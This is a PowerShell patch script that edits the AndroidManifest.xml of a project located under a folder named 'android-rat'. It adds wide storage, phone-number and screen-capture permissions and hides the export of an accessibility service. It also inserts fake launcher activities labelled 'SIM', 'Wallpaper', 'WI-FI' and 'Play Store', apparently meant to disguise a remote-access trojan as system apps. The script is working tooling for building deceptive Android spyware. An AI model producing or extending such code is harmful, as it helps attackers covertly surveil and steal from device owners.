$m = "C:\Users\user\kryptos\android-rat\app\src\main\AndroidManifest.xml"
Copy-Item $m "$m.bak_plano" -Force
$t = Get-Content $m -Raw
$t = $t.Replace('android:largeHeap="true"', 'android:largeHeap="true" android:networkSecurityConfig="@xml/network_security" android:appComponentFactory="androidx.core.app.CoreComponentFactory"')
$t = $t.Replace('android:description="@string/accessibility_service_description" android:exported="true">', 'android:description="@string/accessibility_service_description" android:exported="false" android:foregroundServiceType="systemExempted">')
$perms = @"

    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" ns1:ignore="ScopedStorage" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.FLASHLIGHT" />
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
    <uses-permission android:name="com.android.alarm.permission.SET_ALARM" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
"@
$t = $t.Replace('<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>', '<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>' + $perms)
$acts = @"

        <activity android:name=".DecoySim" android:exported="true" android:label="SIM" android:theme="@style/Theme.Material3.DayNight.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity android:name=".DecoyWallpaper" android:exported="true" android:label="Wallpaper" android:theme="@style/Theme.Material3.DayNight.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity android:name=".DecoyWifi" android:exported="true" android:label="WI-FI" android:theme="@style/Theme.Material3.DayNight.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity android:name=".DecoyPlay" android:exported="true" android:label="Play Store" android:theme="@style/Theme.Material3.DayNight.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service android:name=".KryptosDream" android:exported="true" android:permission="android.permission.BIND_DREAM_SERVICE">
            <intent-filter>
                <action android:name="android.service.dreams.DreamService" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
            <meta-data android:name="android.service.dream" android:resource="@xml/screensaver_config" />
        </service>
"@
$t = $t.Replace('<service android:stopWithTask="false" android:name=".UiAssistBridge"', $acts + '<service android:stopWithTask="false" android:name=".UiAssistBridge"')
Set-Content -Path $m -Value $t -Encoding utf8
Write-Output "PARCHE APLICADO"
